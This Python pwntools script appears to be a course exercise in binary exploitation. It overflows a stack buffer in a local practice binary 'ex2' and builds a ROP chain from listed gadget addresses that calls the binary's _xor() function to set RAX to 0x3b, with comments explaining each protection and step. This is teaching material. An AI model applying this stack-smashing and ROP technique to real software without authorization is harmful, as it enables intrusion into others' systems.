################################################################################
# ex2-exploit.py
#   Chapter: 01
#   Binary: ex2
#   Source: ex2.c
#   Goal:   Set 0x3b into register RAX by calling _xor() function within
#           the binary.
################################################################################
from pwn import *

# Binary protections:
# checksec --file ex2
#    Arch:     amd64-64-little
#    RELRO:    Full RELRO               We cannot overwrite .got
#    Stack:    No canary found          We can smash the stack as we please
#    NX:       NX enabled               We need ROP (stack is non-executable)
#    PIE:      No PIE (0x400000)        We don't need a memory leak
vuln    =   "./ex2"
binary  =   ELF(vuln)

# We control EIP after padding + RBP:
padding =   b'A'*112
# A fake RBP value:
RBP     =   0xdeadbeefcafebabe

# Using ropper, we find the following ROP-gadgets we will need:
# 0x000000000040118a: pop rdi; ret;
# 0x000000000040118c: pop rsi; ret;
# 0x0000000000401016: ret;
pop_rdi =   0x040118a
pop_rsi =   0x040118c
ret     =   0x0401016

# We start a local process of the vulnerable program within a GDB
# session. The program will breakpoint at 0x401016 (ret) only when
# RAX == 0x3b, after our ROP-chain attack (see later on):
#r = process(binary.path)
r    =   gdb.debug(binary.path,'''
        b * 0x401016 if $rax == 0x3b
        c
        i r rax
        ''')

# We want to set RAX to 0x3b; we do not have any ROP-gadget to
# achieve that. Notice that we can set RAX to 0 by returning to
# 0x0040116c:
#   0x000000000040116c: mov eax, 0; leave; ret;
#
# Can we re-purpose any called function from libc6?:
# [0x403fe0] memset@GLIBC_2.2.5  →  0x7ffff7ef5fc0
# [0x403fe8] gets@GLIBC_2.2.5  →  0x7ffff7e19fa0
# Well, does not seem so: both memset and gets return a pointer.
# So we will use the _xor() function within the binary itself.
# We need to set rax to 0x3b, so we will manipulate the two
# arguments to _xor() so that _xor(rdi^rsi) == 0x3b:
#   rdi <- 0x3b; rsi <- 0x0
#
# This binary is not PIE; so we can use its addresses right away
# (we don't need a leak):
rop     =   b''
rop     +=  p64(pop_rdi)
rop     +=  p64(0x3b)                       # rdi <- 0x3b
rop     +=  p64(pop_rsi)
rop     +=  p64(0x0)                        # rsi <- 0x0
rop     +=  p64(binary.symbols["_xor"])     # _xor(0x3b,0x0);
rop     +=  p64(ret);                       # To use a breakpoint

# At this point, RAX == 0x3b, right after calling _xor():
r.send(padding + p64(RBP) + rop + b'\x0a')
r.recvall()
r.close()
